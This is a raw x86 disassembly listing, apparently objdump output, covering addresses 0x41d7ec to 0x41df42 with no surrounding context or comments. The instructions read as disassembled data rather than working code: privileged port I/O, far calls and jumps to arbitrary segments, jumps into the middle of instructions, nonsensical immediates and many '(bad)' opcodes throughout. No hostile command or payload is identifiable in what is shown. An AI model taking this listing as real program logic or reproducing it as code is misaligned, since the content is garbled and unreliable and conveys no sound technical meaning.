  41d7ec:	mov    eax,0x9b5cbe80
  41d7f1:	rcl    esi,0x86
  41d7f4:	mov    al,ds:0x2b719920
  41d7f9:	cmp    edx,ecx
  41d7fb:	mov    ds:0xbd25fade,al
  41d800:	jnp    0x41d850
  41d802:	adc    eax,0x25992fa5
  41d807:	and    al,BYTE PTR [ecx-0x2df95393]
  41d80d:	xor    eax,DWORD PTR [eax-0x28]
  41d810:	cmp    al,0x46
  41d812:	mov    ecx,0xb43145e6
  41d817:	mov    ch,0x8a
  41d819:	pop    edi
  41d81a:	rol    dh,cl
  41d81c:	fwait
  41d81d:	sbb    edi,edx
  41d81f:	mov    cl,0xb
  41d821:	arpl   WORD PTR [ebp-0x7369eab4],bp
  41d827:	into   
  41d828:	cdq    
  41d829:	je     0x41d887
  41d82b:	push   ebp
  41d82c:	xchg   dl,al
  41d82e:	retf   
  41d82f:	icebp  
  41d830:	sti    
  41d831:	in     eax,0x67
  41d833:	in     al,0xa9
  41d835:	ds mov eax,0x19be1ee9
  41d83b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d83c:	and    eax,0xc336288a
  41d841:	lea    ecx,[esi]
  41d843:	mov    eax,ebp
  41d845:	inc    esi
  41d846:	mov    eax,ds:0x9072ef4a
  41d84b:	xor    eax,0x756c0ed
  41d850:	and    ebp,0x45
  41d853:	out    0xde,eax
  41d855:	loop   0x41d85d
  41d857:	lods   eax,DWORD PTR ds:[esi]
  41d858:	mov    eax,0x756d8802
  41d85d:	add    eax,0xbe7cf034
  41d862:	or     cl,BYTE PTR [eax-0xa]
  41d865:	clc    
  41d866:	adc    DWORD PTR [esi],edx
  41d868:	iret   
  41d869:	push   cs
  41d86a:	sbb    eax,0xc8e68666
  41d86f:	scas   al,BYTE PTR es:[edi]
  41d870:	cli    
  41d871:	adc    bl,ah
  41d873:	bound  ebx,QWORD PTR [edi-0x74e2d709]
  41d879:	aad    0x9e
  41d87b:	adc    eax,DWORD PTR [ecx-0x67aeb983]
  41d881:	push   ss
  41d882:	inc    edx
  41d883:	sub    al,0x3d
  41d885:	mov    ds:0x26a5af7a,al
  41d88a:	dec    edx
  41d88b:	push   esi
  41d88c:	in     eax,0xb4
  41d88e:	sub    dl,BYTE PTR [ebp-0x338afd9a]
  41d894:	jae    0x41d88f
  41d896:	push   edi
  41d897:	jg     0x41d836
  41d899:	stc    
  41d89a:	ror    DWORD PTR [ecx],1
  41d89c:	inc    edi
  41d89d:	test   DWORD PTR [edi],0xcd2142c7
  41d8a3:	mov    esp,0xab27a2fc
  41d8a8:	mov    al,0xfb
  41d8ab:	xlat   BYTE PTR ds:[ebx]
  41d8ac:	and    ecx,DWORD PTR [edx+ecx*8+0x6b]
  41d8b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8b1:	mov    ebx,DWORD PTR [ebx]
  41d8b3:	int    0x1a
  41d8b5:	adc    al,BYTE PTR [edx]
  41d8b7:	jp     0x41d899
  41d8b9:	inc    ebx
  41d8ba:	adc    DWORD PTR [eax-0x4bbcdbeb],ecx
  41d8c0:	ins    DWORD PTR es:[edi],dx
  41d8c1:	mov    eax,ds:0x3d4e2fee
  41d8c6:	fadd   QWORD PTR [ecx+edx*8+0x68]
  41d8ca:	push   cs
  41d8cb:	test   al,0x78
  41d8cd:	pop    eax
  41d8ce:	fiadd  DWORD PTR [esi]
  41d8d0:	pop    ss
  41d8d1:	lods   al,BYTE PTR ds:[esi]
  41d8d2:	popa   
  41d8d3:	lock and eax,0x5688aabe
  41d8d9:	leave  
  41d8da:	xor    DWORD PTR [ecx+ebx*1-0x7c],0xffffffb5
  41d8df:	inc    esi
  41d8e0:	mov    ds:0x98a93c32,eax
  41d8e5:	lock lods eax,DWORD PTR ds:[esi]
  41d8e7:	xchg   ebx,eax
  41d8e8:	xchg   BYTE PTR [edx],al
  41d8ea:	xor    DWORD PTR [ebp+0x4a9198de],edi
  41d8f0:	inc    edx
  41d8f1:	repz mov dl,0xdb
  41d8f4:	(bad)  
  41d8f5:	nop
  41d8f6:	ins    BYTE PTR es:[edi],dx
  41d8f7:	adc    eax,0x71481632
  41d8fc:	or     al,BYTE PTR [ecx-0x1327a1e3]
  41d902:	enter  0x4b83,0x3e
  41d906:	fs jp  0x41d92b
  41d909:	add    BYTE PTR [ecx],dl
  41d90b:	aaa    
  41d90c:	imul   edx,edx,0x2f
  41d90f:	arpl   WORD PTR [esp+ebx*1-0x24ca8113],ax
  41d916:	repz mov ecx,0x6a7f1cde
  41d91c:	out    dx,al
  41d91d:	pop    ebp
  41d91e:	mov    DWORD PTR [esi-0x5b53fb6e],esi
  41d924:	mov    dl,0x67
  41d926:	(bad)  
  41d927:	sti    
  41d928:	and    al,BYTE PTR fs:[edi+0x50]
  41d92c:	push   ss
  41d92d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d92e:	pushf  
  41d92f:	push   edx
  41d930:	dec    edi
  41d931:	sub    al,0xfe
  41d933:	adc    bl,BYTE PTR [ebx]
  41d935:	sbb    edx,ebx
  41d937:	xchg   edi,eax
  41d938:	xchg   ebx,eax
  41d939:	imul   ebp,DWORD PTR [ebx+0x22],0x2b
  41d93d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d93e:	or     eax,0x8f430fb6
  41d943:	jecxz  0x41d9bb
  41d945:	push   esi
  41d946:	dec    eax
  41d947:	xchg   esp,eax
  41d948:	push   ebx
  41d949:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d94a:	cmp    BYTE PTR [ebp+eiz*8+0x78d29b0d],dh
  41d951:	jbe    0x41d99e
  41d953:	xchg   edx,eax
  41d954:	jae    0x41d9ce
  41d956:	mov    dh,0xb5
  41d958:	jmp    0x41d8fa
  41d95a:	leave  
  41d95b:	jno    0x41d8e8
  41d95d:	jnp    0x41d940
  41d95f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d960:	js     0x41d991
  41d962:	sbb    al,0x77
  41d964:	dec    ecx
  41d965:	dec    edx
  41d966:	fwait
  41d967:	dec    esp
  41d968:	sbb    bh,dh
  41d96a:	and    esi,0x45
  41d96d:	leave  
  41d96e:	inc    esp
  41d96f:	pop    ds
  41d970:	call   DWORD PTR [esi+0x65e9bb29]
  41d976:	jg     0x41d996
  41d978:	sub    BYTE PTR [eax-0x7b],cl
  41d97b:	jno    0x41d9c4
  41d97d:	jb     0x41d955
  41d97f:	pop    esi
  41d980:	xor    dl,BYTE PTR [edi-0x79a151d7]
  41d986:	add    bh,BYTE PTR [ebx-0x73]
  41d989:	sti    
  41d98a:	cs push ebx
  41d98c:	hlt    
  41d98d:	mov    WORD PTR [edx+0x40],ds
  41d990:	std    
  41d991:	jg     0x41d9a7
  41d993:	mov    eax,0x4b3aa482
  41d998:	daa    
  41d999:	xlat   BYTE PTR ds:[ebx]
  41d99a:	imul   ebp,ebp,0xffffffdb
  41d99d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d99e:	mov    esp,0xacafe100
  41d9a3:	mov    bh,0x11
  41d9a5:	int3   
  41d9a6:	sti    
  41d9a7:	inc    esi
  41d9a8:	stos   BYTE PTR es:[edi],al
  41d9a9:	pop    eax
  41d9aa:	cmp    BYTE PTR [ebp+0x6a19a292],dh
  41d9b0:	push   es
  41d9b1:	fldenv [ebp+0x78cba821]
  41d9b7:	push   ebp
  41d9b8:	mov    eax,ds:0xb6ab7796
  41d9bd:	pop    edi
  41d9be:	jle    0x41d9f8
  41d9c0:	loopne 0x41da32
  41d9c2:	out    0x8f,al
  41d9c4:	mov    ecx,0x94e6cafd
  41d9c9:	xchg   edx,eax
  41d9ca:	ret    
  41d9cb:	int3   
  41d9cc:	or     DWORD PTR ds:0xab424c1b,ecx
  41d9d2:	xor    al,0xb
  41d9d5:	out    0xf,eax
  41d9d7:	sub    bl,bl
  41d9d9:	rol    dl,0x8f
  41d9dc:	and    ch,al
  41d9de:	mov    al,ds:0x639b73f0
  41d9e3:	popf   
  41d9e4:	push   0xffffffe5
  41d9e6:	in     eax,dx
  41d9e7:	xchg   esp,eax
  41d9e8:	push   cs
  41d9e9:	imul   edx,DWORD PTR [ebx+0x12],0xe9a779fd
  41d9f0:	xor    DWORD PTR [esi+0x1b],ebx
  41d9f3:	call   0x6734:0x3898e775
  41d9fa:	inc    esp
  41d9fb:	sar    DWORD PTR [esi-0x50],cl
  41d9fe:	arpl   WORD PTR [esi-0x5a7aa8f2],sp
  41da04:	enter  0xd6fc,0xda
  41da08:	test   BYTE PTR [ecx+0x4802571c],bh
  41da0e:	push   eax
  41da0f:	push   ds
  41da10:	xchg   DWORD PTR [edx],ecx
  41da12:	or     ebx,DWORD PTR [eax]
  41da14:	mov    eax,ds:0xfc7d7729
  41da19:	addr16 pusha 
  41da1b:	mov    bl,bl
  41da1d:	stos   BYTE PTR es:[edi],al
  41da1e:	adc    eax,0x56990625
  41da23:	(bad)  
  41da24:	mov    esp,0x715e40c3
  41da29:	call   DWORD PTR [eax-0x27f63e25]
  41da2f:	fisub  DWORD PTR ds:0xa4a82287
  41da35:	dec    esp
  41da36:	out    dx,al
  41da37:	arpl   WORD PTR [esp+ebp*2+0x74b54063],cx
  41da3e:	inc    ecx
  41da3f:	std    
  41da40:	cld    
  41da41:	mov    esi,0x3a7b1ac0
  41da46:	sub    al,0xb8
  41da48:	sbb    bh,BYTE PTR [ecx+edx*8+0x61]
  41da4c:	fnstcw WORD PTR ss:[ebx-0x51]
  41da50:	pop    ds
  41da51:	jle    0x41daa5
  41da53:	adc    BYTE PTR [edx-0x1f],ah
  41da56:	xchg   edx,eax
  41da57:	cdq    
  41da58:	add    eax,0xffffffdb
  41da5b:	push   edi
  41da5c:	sbb    BYTE PTR [esi+0x415c6878],cl
  41da62:	arpl   WORD PTR [ecx-0x34],di
  41da65:	sbb    BYTE PTR [edx],ah
  41da67:	shl    BYTE PTR [ecx+0x9],1
  41da6a:	lods   eax,DWORD PTR ds:[esi]
  41da6b:	lds    esp,FWORD PTR [edi-0xc]
  41da6e:	in     al,0xc2
  41da70:	outs   dx,DWORD PTR ds:[esi]
  41da71:	fidiv  DWORD PTR [ebx-0x33]
  41da74:	fidivr WORD PTR [ebp-0x74585321]
  41da7a:	call   0xe6a9e4a2
  41da7f:	sub    ebx,0xc20bd9be
  41da85:	mov    ebp,0xddec3d70
  41da8a:	xor    bl,BYTE PTR [edx-0x700094f0]
  41da90:	std    
  41da91:	jl     0x41da86
  41da93:	scas   al,BYTE PTR es:[edi]
  41da94:	in     al,0x4f
  41da96:	bound  edx,QWORD PTR [esi+0x763978cb]
  41da9c:	adc    BYTE PTR [ecx+0x41],cl
  41da9f:	(bad)
  41daa2:	mov    al,0xaa
  41daa4:	mov    ebx,0xdfed6ba1
  41daa9:	push   ebx
  41daaa:	out    dx,al
  41daab:	sub    DWORD PTR [ebp-0x5b],esp
  41daae:	lods   al,BYTE PTR ds:[esi]
  41daaf:	shl    BYTE PTR [esi+0x67ad1dbf],1
  41dab5:	adc    ch,BYTE PTR [ecx+0x7bfd4192]
  41dabb:	sar    DWORD PTR [eax],1
  41dabd:	sub    BYTE PTR [ebx+0x41],cl
  41dac0:	jl     0x41da52
  41dac2:	scas   eax,DWORD PTR es:[edi]
  41dac3:	test   DWORD PTR [ecx],0x7c403809
  41dac9:	loopne 0x41daa7
  41dacb:	cmp    eax,0x7507a38c
  41dad0:	adc    BYTE PTR [ebx+0xa21ec89],al
  41dad6:	icebp  
  41dad7:	sbb    edx,eax
  41dad9:	xor    al,0x2e
  41dadb:	ret    
  41dadc:	dec    edi
  41dadd:	xchg   ecx,eax
  41dade:	mov    edx,0x131fc373
  41dae3:	mov    BYTE PTR [edi],al
  41dae5:	xchg   ebx,eax
  41dae6:	and    eax,0xb970d677
  41daeb:	push   es
  41daec:	xor    eax,0xeebe
  41daf1:	(bad)  
  41daf2:	out    dx,eax
  41daf3:	or     BYTE PTR [esi+edx*8+0xf],bh
  41daf7:	dec    eax
  41daf8:	fld    TBYTE PTR [ecx+0x2c]
  41dafb:	ss xor esi,esi
  41dafe:	mov    ebp,0xed463b54
  41db03:	dec    ebx
  41db04:	dec    BYTE PTR [ecx]
  41db06:	out    dx,al
  41db07:	shl    BYTE PTR [eax],0x7
  41db0a:	cld    
  41db0b:	cwde   
  41db0c:	cmp    eax,0x92201473
  41db11:	cmp    dl,al
  41db13:	sub    eax,0xf8032f06
  41db18:	add    edx,0xffffffc1
  41db1b:	sbb    al,0x64
  41db1d:	jnp    0x41dadb
  41db1f:	or     al,BYTE PTR [esi+0x48]
  41db22:	jne    0x41dada
  41db24:	nop
  41db25:	sbb    al,0x62
  41db27:	mov    al,ds:0x5c11bd62
  41db2c:	jno    0x41db2f
  41db2e:	or     bl,BYTE PTR [edi*4+0x3b948393]
  41db35:	adc    ah,BYTE PTR [ebp+0x5c]
  41db38:	outs   dx,DWORD PTR ds:[esi]
  41db39:	sahf   
  41db3a:	jno    0x41db05
  41db3c:	into   
  41db3d:	pop    ecx
  41db3e:	ror    DWORD PTR [esi+0x37dca599],0xde
  41db45:	xchg   esi,eax
  41db46:	push   es
  41db47:	sub    al,0x40
  41db49:	sub    eax,0xd3c8d948
  41db4e:	jb     0x41db90
  41db50:	js     0x41dae0
  41db52:	dec    ebp
  41db53:	adc    bl,ch
  41db55:	mov    edi,0x668f9742
  41db5a:	out    dx,al
  41db5b:	std    
  41db5c:	lods   eax,DWORD PTR ds:[esi]
  41db5d:	jmp    0x41db04
  41db5f:	imul   esp,edi,0x841d3789
  41db65:	pop    edi
  41db66:	jg     0x41db28
  41db68:	pop    es
  41db69:	cmp    ch,BYTE PTR [eax]
  41db6b:	adc    BYTE PTR [ecx+0x49cb0510],cl
  41db71:	push   ds
  41db72:	outs   dx,BYTE PTR ds:[esi]
  41db73:	cdq    
  41db74:	stos   BYTE PTR es:[edi],al
  41db75:	jbe    0x41dbf1
  41db77:	dec    ebx
  41db78:	sub    dh,dl
  41db7a:	sub    ecx,DWORD PTR [ecx]
  41db7c:	out    0x19,al
  41db7e:	ret    
  41db7f:	loopne 0x41dbbd
  41db81:	bnd je 0x41db7d
  41db84:	pop    esi
  41db85:	dec    ebp
  41db86:	and    dh,BYTE PTR [ebp-0x7d]
  41db89:	scas   eax,DWORD PTR es:[edi]
  41db8a:	in     al,dx
  41db8b:	imul   esi,DWORD PTR [eax],0xffffffe3
  41db8e:	in     eax,0x30
  41db90:	mov    dh,0x1
  41db92:	cmp    edx,DWORD PTR [edx-0x67]
  41db95:	push   edx
  41db96:	xor    eax,0xc71ab998
  41db9b:	jb     0x41dc11
  41db9d:	scas   al,BYTE PTR es:[edi]
  41db9e:	cmp    BYTE PTR ds:0x2c0157dd,bh
  41dba4:	xor    dl,BYTE PTR [edx]
  41dba6:	outs   dx,WORD PTR ds:[esi]
  41dba8:	retf   
  41dba9:	mov    edx,0x475a415d
  41dbae:	dec    edi
  41dbaf:	fldenv [eax]
  41dbb1:	fwait
  41dbb2:	or     ebx,DWORD PTR [ebx-0x182b42e0]
  41dbb8:	sub    esi,DWORD PTR [ebp+0x1c8c4398]
  41dbbe:	pop    edi
  41dbbf:	sar    DWORD PTR [ecx+0x7b],cl
  41dbc2:	sbb    eax,0xc7aec0c
  41dbc7:	dec    edx
  41dbc8:	in     eax,dx
  41dbc9:	popa   
  41dbca:	jmp    0x1957:0x2224b0e8
  41dbd1:	repz jl 0x41db67
  41dbd4:	sti    
  41dbd5:	or     ebp,0x5a2e4b91
  41dbdb:	xor    ebp,DWORD PTR [esi+ecx*4]
  41dbde:	push   es
  41dbdf:	or     bl,BYTE PTR [edx-0x62ad3d8e]
  41dbe5:	aas    
  41dbe6:	mov    esi,0xcd46c643
  41dbeb:	(bad)  
  41dbed:	pop    ecx
  41dbee:	bound  esi,QWORD PTR [ebp+0x2f8203a6]
  41dbf4:	arpl   WORD PTR [eax+0x25],bp
  41dbf7:	stos   BYTE PTR es:[edi],al
  41dbf8:	test   al,0xc9
  41dbfa:	jne    0x41dc4f
  41dbfc:	leave  
  41dbfd:	mov    ebp,0x550c7557
  41dc02:	mov    bh,0x25
  41dc04:	stos   BYTE PTR es:[edi],al
  41dc05:	pop    ds
  41dc06:	jbe    0x41dc45
  41dc08:	test   al,0xd8
  41dc0a:	xor    DWORD PTR [ecx+edx*8+0x4cc81ae7],0xa9528618
  41dc15:	pop    ds
  41dc16:	sbb    ah,BYTE PTR [ebx-0x4a]
  41dc19:	mov    cs,WORD PTR [ecx-0x5b1c8a0b]
  41dc1f:	ret    
  41dc20:	push   ss
  41dc21:	jo     0x41dbce
  41dc23:	push   gs
  41dc25:	int    0x36
  41dc27:	add    al,0x7f
  41dc29:	add    bh,BYTE PTR [ebp+0x64a7f7ba]
  41dc2f:	iret   
  41dc30:	inc    edi
  41dc31:	stc    
  41dc32:	mov    eax,ds:0x98a5ca04
  41dc37:	lds    edi,FWORD PTR [edi-0x38]
  41dc3a:	push   eax
  41dc3b:	test   BYTE PTR [esi+edx*4-0x33007f61],0x8e
  41dc43:	dec    esi
  41dc44:	mov    BYTE PTR [ebp+0x1f],dh
  41dc47:	jl     0x41dcc6
  41dc49:	jmp    0x41dbfe
  41dc4b:	rcl    ebx,0xd7
  41dc4e:	mov    fs,WORD PTR [ecx-0x1e345bdc]
  41dc54:	xchg   ecx,eax
  41dc55:	dec    eax
  41dc56:	mov    dl,0x13
  41dc58:	cmp    ah,BYTE PTR [esi]
  41dc5a:	call   0x9a40:0xa0ab0458
  41dc61:	pop    eax
  41dc62:	mov    dh,0xa
  41dc64:	xlat   BYTE PTR ds:[ebx]
  41dc65:	mov    dh,0xe
  41dc67:	rep ins DWORD PTR es:[edi],dx
  41dc69:	sbb    bh,ah
  41dc6b:	xor    DWORD PTR [edx+0x47],edx
  41dc6e:	sbb    eax,0x66c76310
  41dc73:	push   esp
  41dc74:	xchg   ecx,eax
  41dc75:	push   ss
  41dc76:	test   eax,0x59e7f8b1
  41dc7b:	sub    eax,0x8c1535db
  41dc80:	pop    ss
  41dc81:	in     eax,0x4f
  41dc83:	sub    al,BYTE PTR ds:0xbe4560f9
  41dc89:	pop    esp
  41dc8a:	aas    
  41dc8b:	sar    DWORD PTR [ecx+0xb],1
  41dc8e:	add    BYTE PTR [edi+eax*4+0x3e6c7ce5],bl
  41dc95:	es sahf 
  41dc97:	adc    DWORD PTR [edi+0x754c7fc6],ecx
  41dc9d:	daa    
  41dc9e:	or     DWORD PTR [ecx-0x5d57a0d4],edx
  41dca4:	je     0x41dc66
  41dca6:	repnz int 0x4
  41dca9:	sub    BYTE PTR [ebx],bh
  41dcab:	sbb    DWORD PTR [edx-0x40],0x6f
  41dcaf:	mov    ebp,0x95687e3
  41dcb4:	or     ecx,DWORD PTR [ecx-0x8a4388a]
  41dcba:	jne    0x41dcf3
  41dcbc:	dec    ecx
  41dcbd:	ins    BYTE PTR es:[edi],dx
  41dcbe:	pop    esp
  41dcbf:	aaa    
  41dcc0:	js     0x41dd2f
  41dcc2:	xchg   edx,eax
  41dcc3:	xchg   edx,eax
  41dcc4:	stos   DWORD PTR es:[edi],eax
  41dcc5:	shr    DWORD PTR ds:0x9ee07c35,1
  41dccb:	add    ebp,ebx
  41dccd:	push   0x5f7f2c4d
  41dcd2:	mov    edi,0x7a0f4a9a
  41dcd7:	cmp    WORD PTR [eax],bx
  41dcda:	jg     0x41dd10
  41dcdc:	push   edi
  41dcdd:	mov    edi,0xb167db16
  41dce2:	add    esp,DWORD PTR [edx+0x54]
  41dce5:	aam    0x53
  41dce7:	or     BYTE PTR [ebp-0x10],ah
  41dcea:	inc    esi
  41dceb:	xor    bh,BYTE PTR [eax+0x6f80f0fa]
  41dcf1:	in     eax,0x46
  41dcf3:	mov    WORD PTR [esi-0x2c],?
  41dcf6:	test   eax,0xa4ca5019
  41dcfb:	aad    0xcd
  41dcfd:	fwait
  41dcfe:	pusha  
  41dcff:	cld    
  41dd00:	push   ebx
  41dd01:	pop    ds
  41dd02:	out    dx,al
  41dd03:	stc    
  41dd04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd05:	xor    ax,0x78cc
  41dd09:	jg     0x41dd75
  41dd0b:	pusha  
  41dd0c:	jnp    0x41dd7b
  41dd0e:	cmp    DWORD PTR [ebx],ecx
  41dd10:	fstp   DWORD PTR [ebp-0x2fa0c218]
  41dd16:	jnp    0x41dcb5
  41dd18:	mov    gs,WORD PTR [edi]
  41dd1a:	pop    esp
  41dd1b:	ds fwait
  41dd1d:	sub    bl,BYTE PTR [ecx+eiz*8-0x1b57ca3c]
  41dd24:	add    al,0xd4
  41dd26:	(bad)  
  41dd27:	sbb    dh,BYTE PTR [ebx]
  41dd29:	ror    BYTE PTR [edi],0x6c
  41dd2c:	xchg   ebx,eax
  41dd2d:	jg     0x41dd87
  41dd2f:	jo     0x41dd6c
  41dd31:	test   DWORD PTR [edx],0xe46b4351
  41dd37:	call   0xb44b:0x604a63dd
  41dd3e:	popa   
  41dd3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd40:	mov    dh,0x6c
  41dd42:	out    0xf8,eax
  41dd44:	jecxz  0x41dd02
  41dd46:	cmp    ch,BYTE PTR [esi-0x20cff017]
  41dd4c:	or     eax,0x6d1b2fac
  41dd51:	add    al,0xed
  41dd53:	xchg   ecx,eax
  41dd54:	lea    ebx,[esi]
  41dd56:	sub    DWORD PTR [ebx],edx
  41dd58:	dec    ebx
  41dd59:	lods   eax,DWORD PTR ds:[si]
  41dd5b:	inc    eax
  41dd5d:	sbb    DWORD PTR [ebx],esi
  41dd5f:	cmp    BYTE PTR [esi+edx*8],ah
  41dd62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd63:	jns    0x41dd99
  41dd65:	dec    esp
  41dd66:	push   ebp
  41dd67:	inc    edi
  41dd68:	ds ins BYTE PTR es:[edi],dx
  41dd6a:	pop    esi
  41dd6b:	int    0x49
  41dd6d:	mov    bl,BYTE PTR [esi+0x7f044369]
  41dd73:	jns    0x41dd3d
  41dd75:	lock stos BYTE PTR es:[edi],al
  41dd77:	adc    cl,ch
  41dd79:	xchg   ebx,eax
  41dd7a:	mov    ecx,0x62b02350
  41dd7f:	and    eax,0x7eafa27a
  41dd84:	xchg   ebx,eax
  41dd85:	cmc    
  41dd86:	out    0xe9,eax
  41dd88:	stos   BYTE PTR es:[edi],al
  41dd89:	jp     0x41dda9
  41dd8b:	cmp    bl,BYTE PTR [ecx+0x17]
  41dd8e:	iret   
  41dd8f:	adc    eax,0x3f4fdb3e
  41dd94:	jmp    0x41dd2a
  41dd96:	and    dl,BYTE PTR [ebp+0x1d]
  41dd99:	push   0x14
  41dd9b:	ss mov esi,0xcb5d21d1
  41dda1:	(bad)  
  41dda2:	(bad)  
  41dda3:	sar    eax,1
  41dda5:	jle    0x41dd2a
  41dda7:	sbb    BYTE PTR ds:0xa0636178,0xe3
  41ddae:	jno    0x41dd6d
  41ddb0:	sahf   
  41ddb1:	cmp    dl,BYTE PTR [edi-0x20]
  41ddb4:	fwait
  41ddb5:	sbb    al,0xc2
  41ddb7:	sbb    DWORD PTR [ebx+0x4e],eax
  41ddba:	jnp    0x41dd81
  41ddbc:	mov    edx,fs
  41ddbe:	ja     0x41ddfb
  41ddc0:	adc    DWORD PTR [eax+0x3671a91f],0xb1ed831b
  41ddca:	inc    edx
  41ddcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddcc:	sbb    edi,DWORD PTR [ebx]
  41ddce:	ins    BYTE PTR es:[edi],dx
  41ddcf:	xchg   edi,eax
  41ddd0:	xor    DWORD PTR [edx],edx
  41ddd2:	and    eax,0xd7cdc0fe
  41ddd7:	xchg   edi,eax
  41ddd8:	lea    ecx,[ecx+0x454fa8fe]
  41ddde:	jp     0x41ddc4
  41dde0:	add    eax,0x8fd940c1
  41dde5:	mov    edx,0xdb0f8dd1
  41ddea:	pop    es
  41ddeb:	jbe    0x41dde3
  41dded:	adc    DWORD PTR [eax],ebx
  41ddef:	jecxz  0x41dde2
  41ddf1:	pop    edx
  41ddf2:	sub    BYTE PTR [ebp+0x5795d24f],dh
  41ddf8:	push   esp
  41ddf9:	ret    
  41ddfa:	jl     0x41de71
  41ddfc:	retf   
  41ddfd:	and    BYTE PTR [ebx-0x459a58ec],cl
  41de03:	pop    esi
  41de04:	sbb    esi,ebx
  41de06:	ret    0xb2b2
  41de09:	or     ebx,esi
  41de0b:	inc    esp
  41de0c:	clc    
  41de0d:	shl    dl,1
  41de0f:	mov    ecx,0xa3f3c1c8
  41de14:	mov    DWORD PTR [ecx],ecx
  41de16:	outs   dx,DWORD PTR ds:[esi]
  41de17:	dec    ecx
  41de18:	xor    DWORD PTR [eax+0x7cacf76b],0x7f
  41de1f:	mov    bl,0x8b
  41de21:	data16 (bad) 
  41de23:	stos   DWORD PTR es:[edi],eax
  41de24:	fs cmp bh,0x46
  41de28:	loope  0x41de7e
  41de2a:	scas   eax,DWORD PTR es:[edi]
  41de2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de2c:	(bad)  
  41de2d:	mov    ds:0x1d199c47,eax
  41de32:	sub    eax,0x9ef0a4a3
  41de37:	add    BYTE PTR [edx+0x15f7e96c],0xcc
  41de3e:	ins    BYTE PTR es:[edi],dx
  41de3f:	rcl    BYTE PTR [ebp+0x17],cl
  41de42:	pop    ss
  41de43:	xor    dh,bh
  41de45:	retf   0x667a
  41de48:	inc    ebp
  41de49:	inc    esp
  41de4a:	push   ds
  41de4b:	cmp    DWORD PTR ds:0x764d3d6e,edi
  41de51:	icebp  
  41de52:	mov    ecx,0xbd5eacf
  41de57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de58:	push   cs
  41de59:	push   ds
  41de5a:	cmp    eax,0xbae72adb
  41de5f:	frstor [edi-0x6d57b27b]
  41de65:	xchg   DWORD PTR [ecx+0x13db977e],eax
  41de6b:	mov    esp,DWORD PTR [esi]
  41de6d:	fistp  WORD PTR [esi+0x617be3d1]
  41de73:	push   es
  41de74:	pop    edi
  41de75:	pop    ss
  41de76:	cmp    eax,0x445465d
  41de7b:	xlat   BYTE PTR ds:[ebx]
  41de7c:	lahf   
  41de7d:	jge    0x41de68
  41de7f:	(bad)  
  41de80:	xlat   BYTE PTR es:[ebx]
  41de82:	(bad)  
  41de83:	leave  
  41de84:	mov    ebx,0x92282930
  41de89:	std    
  41de8a:	lahf   
  41de8b:	into   
  41de8c:	xor    al,0x78
  41de8e:	xchg   esp,eax
  41de8f:	js     0x41de25
  41de91:	jmp    0x36a16b69
  41de96:	(bad)  
  41de97:	sbb    edx,DWORD PTR [edx]
  41de99:	inc    ebp
  41de9a:	push   edx
  41de9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de9c:	sbb    eax,0xb51771d0
  41dea1:	push   edx
  41dea2:	loop   0x41de97
  41dea4:	dec    edi
  41dea5:	(bad)  
  41dea6:	mul    BYTE PTR [esi-0x35]
  41dea9:	in     eax,dx
  41deaa:	add    al,0x31
  41deac:	mov    ds:0x2cc124c3,eax
  41deb1:	mov    BYTE PTR [ebx-0x27],bh
  41deb4:	cli    
  41deb5:	rcr    DWORD PTR [edi+0x7b],1
  41deb8:	dec    esp
  41deb9:	pop    edx
  41deba:	lock daa 
  41debc:	mov    ebp,0x4599b5b6
  41dec1:	or     edi,ecx
  41dec3:	xchg   ebx,eax
  41dec4:	jmp    0x603f:0x7ba6fc2f
  41decb:	or     ch,BYTE PTR [esi+0x6204efb1]
  41ded1:	aas    
  41ded2:	jp     0x41df4f
  41ded4:	sar    cl,cl
  41ded6:	sar    BYTE PTR [esi+ecx*1],0x1c
  41deda:	lods   al,BYTE PTR ds:[esi]
  41dedb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dedc:	mov    ebx,DWORD PTR [ebx-0x4]
  41dedf:	mov    BYTE PTR [ebx+0x38],ah
  41dee2:	jecxz  0x41dead
  41dee4:	xchg   edx,eax
  41dee5:	or     ah,0x10
  41dee8:	ss dec ecx
  41deea:	cli    
  41deeb:	(bad)  
  41deec:	mov    dl,0x95
  41deee:	popf   
  41deef:	dec    edi
  41def0:	xor    ebx,DWORD PTR [edx+edi*1]
  41def3:	ret    0xe218
  41def6:	cmc    
  41def7:	jnp    0x41df1d
  41def9:	pop    ebx
  41defa:	and    eax,0xcbc68084
  41deff:	inc    esp
  41df00:	or     al,0xfb
  41df02:	cmp    DWORD PTR [edx],edi
  41df04:	adc    DWORD PTR [ebx-0x79],eax
  41df07:	in     eax,dx
  41df08:	jnp    0x41df61
  41df0a:	lods   eax,DWORD PTR ds:[esi]
  41df0b:	add    ch,dh
  41df0d:	ror    bl,cl
  41df0f:	lods   al,BYTE PTR ds:[esi]
  41df10:	(bad)  
  41df12:	jns    0x41df41
  41df14:	test   DWORD PTR [edx-0x80],edi
  41df17:	in     ax,0xc0
  41df1a:	arpl   WORD PTR [edx+0x6c28c1eb],di
  41df20:	int3   
  41df21:	aaa    
  41df22:	lods   al,BYTE PTR ds:[esi]
  41df23:	es inc ebx
  41df25:	mov    edi,0x4bbb9870
  41df2a:	int    0x84
  41df2c:	inc    ecx
  41df2d:	loope  0x41df40
  41df2f:	(bad)  [edi]
  41df31:	(bad)  
  41df32:	loope  0x41dedb
  41df34:	loop   0x41df63
  41df36:	or     ebp,DWORD PTR [ebx+0x7b]
  41df39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df3a:	nop
  41df3b:	mov    dh,0xcc
  41df3d:	sti    
  41df3e:	sub    ch,dh
  41df40:	or     ch,ch
  41df42:	and    ah,BYTE PTR [ebp+0x682026e4]
